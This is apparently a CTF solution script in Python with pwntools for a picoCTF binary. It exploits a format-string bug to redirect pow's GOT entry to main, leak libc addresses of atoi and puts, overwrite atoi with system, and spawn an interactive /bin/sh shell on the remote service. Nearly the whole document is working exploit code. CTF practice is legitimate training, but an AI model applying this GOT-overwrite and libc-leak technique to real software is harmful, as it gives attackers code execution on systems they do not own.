# python exploit.py REMOTE mars.picoctf.net 31929
from pwn import *
from Crypto.Util.number import bytes_to_long, long_to_bytes

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './chall'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'debug'

pow_addr = elf.got['pow']
atoi_addr = elf.got['atoi']
puts_addr = elf.got['puts']
print('pow', hex(pow_addr))
print('atoi', hex(atoi_addr))

io = start()

# get a sample payload first, then make the %{k}$n in the generated payload to match our desired k, here k is 19
# i.e. when the payload before the addresses are of length 72, the first address is indexed by %19$n
pp = fmtstr_payload(19, {pow_addr: elf.functions.main}, write_size='byte', numbwritten=21)
addr_pos = pp.index(long_to_bytes(pow_addr)[::-1])
actual_payload = pp[:addr_pos]
generated_offset_loc = int(re.match(r'%[0-9]+c%([0-9]+)\$.*', actual_payload.decode()).groups()[0])
pp = fmtstr_payload(19-(generated_offset_loc-19), {pow_addr: elf.functions.main}, write_size='byte', numbwritten=21)
actual_payload = pp[:addr_pos]
actual_payload = b'1_' + actual_payload
# 72 characters, so the first address is at %19$n
# add back the addresses after padding the things before addresses to 72 bytes
actual_payload += b'A' * (72 - len(actual_payload)) + pp[addr_pos:]
payload1 = actual_payload
if False:
    # "Calculating for A: 1_"
    # above is 21 char
    # main address is 0x400837
    # pow_addr: 0x0837
    # pow_addr+2: 0x40
    # 0x0837 - 21 - 3 - 43 = 2036
    # 21 for Calculating for A: 1_
    # 3 for abc
    # 43 for %43c
    payload1 = b'1_%43c%15$hhnabc' + b'%2036c%1' + b'6$hnDaaa' + b'abcdefgh' + p64(pow_addr+2) + p64(pow_addr)

io.sendlineafter(b'A: ', payload1)
io.sendlineafter(b'B: ', b'2')

# now get atoi and puts for getting libc version
payload1 = b'1_%12$s_%13$s_BB' + p64(atoi_addr) + p64(puts_addr)
io.recvuntil(b'Fermat')
io.sendlineafter(b'A: ', payload1)
io.sendlineafter(b'B: ', b'2')
res = io.recvline()

_, atoi_libc, puts_libc = res.split(b'_')[:3]
atoi_libc = bytes_to_long(atoi_libc[::-1])
puts_libc = bytes_to_long(puts_libc[::-1])
print('atoi', hex(atoi_libc))
print('puts', hex(puts_libc))

# atoi
# 0x7f5442f3f640
# puts
# 0x7f5442f7ced0

# start of libc -- by brute force from pwndbg command line....
# 0x7f5442efc000
# puts -> 0x80ed0
# atoi -> 0x43640

# this is for getting libc version
# libc 2.35, get from
# https://libc.blukat.me/?q=puts%3A80ed0%2Catoi%3A43640&l=libc6_2.35-0ubuntu3_amd64

binsh_offset = 0x1d8698
system_offset = 0x50d60
atoi_offset = 0x43640
atoi_to_system_offset = system_offset - atoi_offset
sys_libc = atoi_libc + atoi_to_system_offset

# now overwrite atoi with system
# 80 characters before the first address, so the first address is indexed by%20$n
pp = fmtstr_payload(20, {atoi_addr: sys_libc}, write_size='byte', numbwritten=21)
actual_payload = pp[:pp.index(b'\x10')-1]   # before the addresses
generated_offset_loc = int(re.match(r'%[0-9]+c%([0-9]+)\$.*', actual_payload.decode()).groups()[0])
pp = fmtstr_payload(20-(generated_offset_loc-20), {atoi_addr: sys_libc}, write_size='byte', numbwritten=21)
actual_payload = pp[:pp.index(b'\x10')-1]
actual_payload = b'1_' + actual_payload
# add back the addresses after padding the things before addresses to 80 bytes
actual_payload += b'A' * (80 - len(actual_payload)) + pp[pp.index(b'\x10')-1:]
payload1 = actual_payload

if False:
    # manually craft the payload by writing each byte by format string vulnerability, starting from the smallest byte to write
    sys_libc_b = long_to_bytes(sys_libc)
    bs = [sys_libc_b[-1], sys_libc_b[-2], sys_libc_b[-3]]
    sorted_nums = sorted(enumerate(bs), key=lambda x:x[1])   # e.g. [(1, 61), (0, 96), (2, 118)]
    if sorted_nums[0][1] < 21:
        raise Exception("this simple algorithm doesn't work for byte value < 21, as 21 bytes have been written already")

    payload1 = '1_'
    total = 21
    pos_idx = 15
    for i, (idx, num) in enumerate(sorted_nums):
        payload1 += '%' + str(num-total) + 'c%' + str(pos_idx+i) + '$hhn'
        total = num

    # 40 characters, so the first address is at %15$n
    payload1 += (40-len(payload1)) * 'A'
    payload1 = payload1.encode()
    for i, (idx, num) in enumerate(sorted_nums):
        payload1 += p64(atoi_addr+idx)

io.sendlineafter(b'A: ', payload1)
io.sendlineafter(b'B: ', b'2')

io.recvuntil(b'Fermat')
io.sendlineafter(b'A: ', b'/bin/sh')
io.sendlineafter(b'B: ', b'2')

io.interactive()